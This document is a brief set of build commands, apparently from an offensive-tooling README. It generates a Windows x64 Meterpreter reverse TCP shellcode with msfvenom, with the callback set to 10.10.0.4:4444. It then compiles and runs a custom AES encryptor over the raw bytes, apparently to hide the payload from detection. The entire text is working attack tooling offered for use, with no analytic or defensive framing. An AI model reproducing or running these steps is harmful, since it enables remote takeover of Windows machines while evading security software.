```bash
# make shellcode
msfvenom --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.0.4 LPORT=4444 -f raw > raw_bytes_file
```
```cmd
:: compile encryptor
gcc .\encrypt.c .\CtAes.c -o encrypt.exe -mrdrnd
```
```cmd
:: build shellcode
encrypt.exe raw_bytes_file
```
